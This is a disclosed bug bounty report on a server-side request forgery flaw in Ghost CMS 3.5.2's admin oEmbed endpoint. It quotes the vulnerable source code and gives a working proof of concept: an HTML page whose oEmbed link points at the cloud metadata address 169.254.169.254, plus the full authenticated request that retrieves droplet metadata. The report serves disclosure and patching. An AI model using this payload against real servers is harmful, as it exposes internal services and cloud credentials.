# Server-Side Request Forgery (SSRF) in Ghost CMS 

## Report Details
- **Report ID**: 793704
- **URL**: https://hackerone.com/reports/793704
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-02-11T16:33:58.658Z
- **Disclosed**: 2020-03-09T12:21:11.600Z

## Reporter
- **Username**: whoareme
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report about SSRF vulnerability in CMS Ghost blog

It allows attacker able to send a crafted GET request from a vulnerable web application

# Module

**module name:** ghost
**version:** 3.5.2
**npm page:** `https://www.npmjs.com/package/ghost`
**website page** `https://ghost.org/`

## Module Description

Ghost is the world’s most popular open source headless Node.js CMS. 

## Module Stats

4,812 weekly downloads

This CMS is used around 512,000 times for creating Blogs in 2018 according to Ghost statics. Currently the biggest customers of this blog are: Apple, Elon Musk's OpenAI team, Tinder, DigitalOcean, DuckDuckGo, Mozilla, Airtable, Revolt, etc.

# Vulnerability
Attacker with publisher role (editor, author, contributor, administrator) in a blog may be able to leverage this to make arbitrary GET requests in a CMS Ghost Blog instance's to internal / external network.

## Vulnerability Description
CMS Ghost allows publishers to set up embed content from many sources (like Youtube, Twitter, Instagram, etc).
F713079

When click you click on the “Other…” button you can see the following input.
F713080
This input are send request to the route which is vulnerable for the SSRF attack. Let's discover it! 
When you try to pass some URL into this input we receive response like that:
```
GET /ghost/api/v3/admin/oembed/?url=http://169.254.169.254/metadata/v1.json&type=embed
```
F713081
In my case I trying to receive DigitalOcean MetaData from my server.

But, sadly In that moment we receive only validation error. That’s because responsible for that function [query()](https://github.com/TryGhost/Ghost/blob/master/core/server/api/canary/oembed.js#L145) doesn’t receive any content from function fetchOembedData().
```javascript
File: /Ghost/core/server/api/canary/oembed.js

module.exports = {
    docName: 'oembed',
    read: {
        permissions: false,
        data: [
            'url',
            'type'
        ],
        options: [],
        query({data}) {
            let {url, type} = data;

            if (type === 'bookmark') {
                return fetchBookmarkData(url);
            }

            return fetchOembedData(url).then((response) => {
                if (!response && !type) {
                    return fetchBookmarkData(url);
                }
                return response;
            }).then((response) => {
                if (!response) {
                    return unknownProvider(url);
                }
                return response;
            }).catch(() => {
                return unknownProvider(url);
            });
        }
    }
};
```
If we add breakpoint in fetchOembedData() function. And when will go across all lines of code in this function. We will notice interesting function that is call [getOembedUrlFromHTML()](https://github.com/TryGhost/Ghost/blob/master/core/server/api/canary/oembed.js#L109)
```javascript
File: /Ghost/core/server/api/canary/oembed.js

function fetchOembedData(url) {
    let provider;
    ({url, provider} = findUrlWithProvider(url));
    if (provider) {
        return knownProvider(url);
    }
    return request(url, {
        method: 'GET',
        timeout: 2 * 1000,
        followRedirect: true,
        headers: {
            'user-agent': 'Ghost(https://github.com/TryGhost/Ghost)'
        }
    }).then((response) => {
        if (response.url !== url) {
            ({url, provider} = findUrlWithProvider(response.url));
        }
        if (provider) {
            return knownProvider(url);
        }
        const oembedUrl = getOembedUrlFromHTML(response.body);
        if (oembedUrl) {
            return request(oembedUrl, {
                method: 'GET',
                json: true
            }).then((response) => {
                return response.body;
            }).catch(() => {});
        }
    });
}
```
This [function](https://github.com/TryGhost/Ghost/blob/master/core/server/api/canary/oembed.js#L70) is responsible for getting oEmbed URL from external resources.
```javascript
File: /Ghost/core/server/api/canary/oembed.js

const getOembedUrlFromHTML = (html) => {
    return cheerio('link[type="application/json+oembed"]', html).attr('href');
};
```
>"oEmbed is a format for allowing an embedded representation of a URL on third party sites. The simple API allows a website to display embedded content (such as photos or videos) when a user posts a link to that resource, without having to parse the resource directly."

And here we can notice before and after executing getOembedUrlFromHTML() function don’t exist any validation which can prevent against from the SSRF attacks.  

## Steps To Reproduce:

Currently, we know how we can bypass validation in vulnerable route and now we can easily create exploit for this.

First of all, we should create an HTML page with  "link[type="application/json+oembed”]” malicious URL which we would like to discover:
 ```
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Testing</title>
    <link rel="alternate" type="application/json+oembed" href="http://169.254.169.254/metadata/v1.json"/>
</head>
<body></body>
</html>
```

And serve this page by the Python SimpleHTTPServer module:
 
```python -m SimpleHTTPServer 8000```

If your target is located in not your local network you can use ngrok library for creating a tunnel to your HTML page.
 
And send the following request with publisher Cookies
```
GET /ghost/api/v3/admin/oembed/?url=http://169.254.169.254/metadata/v1.json&type=embed HTTP/1.1
Host: YOUR_WEBSITE
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
X-Ghost-Version: 3.5
App-Pragma: no-cache
User-Agent: Mozilla/5.0
Content-Type: application/json; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: en-US;
Cookie: ghost-admin-api-session=YOUR_SESSION
```
And we finally receive a response from the internal DigitalOcean service with my Droplet MetaData. 
SSRF vulnerability is working! 🥳

F713098

## Supporting Material/References:
- OS: macOS current
- Node.js: 10.15.2
- NPM: 6.11.3

# Wrap up

- I contacted the maintainer to let them know: Yes
- I opened an issue in the related repository: No

## Impact

Attacker with publisher role (editor, author, contributor, administrator) in a blog may be able to leverage this to make arbitrary GET requests in a Ghost Blog instance's to internal / external network.

## Attachments
- 2020-02-11_17.06.04.jpg
- 2020-02-11_17.06.41.jpg
- 2020-02-11_17.56.17.jpg
- 2020-02-11_17.07.09.jpg
